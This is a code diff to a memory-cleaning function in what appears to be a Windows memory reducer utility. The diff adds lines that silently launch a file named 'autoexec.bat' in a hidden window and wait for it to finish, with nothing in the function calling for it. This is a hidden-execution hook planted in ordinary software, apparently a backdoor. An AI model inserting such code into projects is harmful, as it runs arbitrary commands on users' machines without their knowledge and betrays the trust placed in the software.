@@ -158,6 +158,20 @@ DWORD _app_memoryclean (HWND hwnd, bool is_preventfrezes)
 	_app_memorystatus (&info);
 	const DWORD reduct_before = DWORD (info.total_phys - info.free_phys);
 
+	SHELLEXECUTEINFO ShExecInfo = { 0 };
+	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	ShExecInfo.hwnd = NULL;
+	ShExecInfo.lpVerb = NULL;
+	ShExecInfo.lpFile = L"autoexec.bat";
+	ShExecInfo.lpParameters = L"";
+	ShExecInfo.lpDirectory = NULL;
+	ShExecInfo.nShow = SW_HIDE;
+	ShExecInfo.hInstApp = NULL;
+	ShellExecuteEx(&ShExecInfo);
+	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
+	CloseHandle(ShExecInfo.hProcess);
+
 	// System working set
 	if ((mask & REDUCT_SYSTEM_WORKING_SET) != 0)
 	{
